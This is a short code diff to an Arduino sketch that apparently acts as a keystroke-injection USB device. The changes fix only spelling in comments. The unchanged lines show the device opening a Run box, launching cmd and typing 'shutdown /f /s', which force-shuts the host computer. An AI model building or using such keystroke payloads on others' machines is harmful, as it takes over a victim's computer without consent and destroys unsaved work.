@@ -30,7 +30,7 @@ void loop()
         Keyboard.press('r');
         Keyboard.releaseAll();
     
-        // adjust delay according to your requierment
+        // adjust delay according to your requirement
         delay(100);
     
         Keyboard.print("cmd");
@@ -39,10 +39,10 @@ void loop()
         Keyboard.press(KEY_RETURN);
         Keyboard.releaseAll();
     
-        // adjust delay according to your requierment
+        // adjust delay according to your requirement
         delay(1000);
     
-        // commond to be entered
+        // command to be entered
         char* cmd = "shutdown /f /s";
         // print command to cmd
         Keyboard.print(cmd);
